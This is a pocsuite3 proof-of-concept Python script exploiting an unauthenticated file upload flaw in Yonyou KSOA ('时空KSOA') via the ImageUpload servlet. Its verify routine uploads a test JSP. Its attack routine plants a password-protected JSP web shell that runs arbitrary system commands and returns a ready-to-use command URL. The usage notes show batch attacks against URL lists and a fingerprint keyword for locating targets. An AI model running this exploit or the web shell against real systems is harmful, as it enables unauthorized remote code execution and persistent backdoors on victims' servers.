from collections import OrderedDict
import re,random,hashlib,base64
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.api import OptString
from urllib.parse import urljoin
from pocsuite3.lib.utils import random_str
from requests_toolbelt.multipart.encoder import MultipartEncoder


class DemoPOC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2022-07-28'  #漏洞公开的时间,不知道就写今天
    createDate = '2022-07-28'  # 编写 PoC 的日期
    updateDate = '2022-07-28'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = '用友-时空KSOA前台文件上传漏洞'  # PoC 名称
    appPowerLink = 'www.yonyou.com'  # 漏洞厂商主页地址
    appName = '用友企业信息系统门户'  # 漏洞应用名称
    appVersion = '''V9.0'''  # 漏洞影响版本
    samples = ['http://192.168.3.8']  # 测试样列，就是用 PoC 测试成功的目标
    vulType = "File Upload"  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
    # usage : 
        pocsuite -r pocs/yongyou_ksoa_upload_rce.py -f urls.txt --verify
        pocsuite -r pocs/yongyou_ksoa_upload_rce.py -f urls.txt --attack
        pocsuite -r pocs/yongyou_ksoa_upload_rce.py -u http://192.168.3.8 --verify
        pocsuite -r pocs/yongyou_ksoa_upload_rce.py -u http://192.168.3.8 --attack
    # keyword : 
        app="用友-时空KSOA"
        
    '''
    def _options(self):
        o = OrderedDict()
        return o
    
    def _verify(self):
        result = {}
        str_num = str(random.randint(1000000000,9999999999))
        base64_num = base64.b64encode(str_num.encode('utf-8')).decode('ascii')
        path="/servlet/com.sksoft.bill.ImageUpload?filepath=/&filename={name}.jsp".format(name=str_num)
        #print(path)
        url = self.url + path
        headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'
        }
        data = """<% out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("{base64}"))); %>""".format(base64=base64_num)
        try:
            resq = requests.post(url=url,data=data,headers=headers,timeout=5)
            return_path = re.search('(?<=<root>).*(?=</root>)',resq.text).group(0)
            #print(return_path)
            resq_verify = requests.get(url=self.url+return_path,headers=headers,timeout=5)
            if return_path in resq.text and str_num in resq_verify.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url + return_path
        except Exception as e:
            return
        return self.parse_output(result)      

    def _attack(self):
        result = {}
        str_num = str(random.randint(1000000000,9999999999))
        path="/servlet/com.sksoft.bill.ImageUpload?filepath=/&filename={name}.jsp".format(name=str_num)
        url = self.url + path
        headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'
        }
        # jsp shell
        data = """<% out.println(new String("happy day"));if("023".equals(request.getParameter("pwd"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print("<pre>"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print("</pre>"); } %>"""

        resq = requests.post(url=url,data=data,headers=headers,timeout=5)

        return_path = re.search('(?<=<root>).*(?=</root>)',resq.text).group(0)
        # print(return_path)

        resq_verify = requests.get(url=self.url+return_path,headers=headers,timeout=5)
        if return_path in resq.text and "happy day" in resq_verify.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url + return_path + "?pwd=023&i=whoami"

        return self.parse_output(result)      

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(DemoPOC)
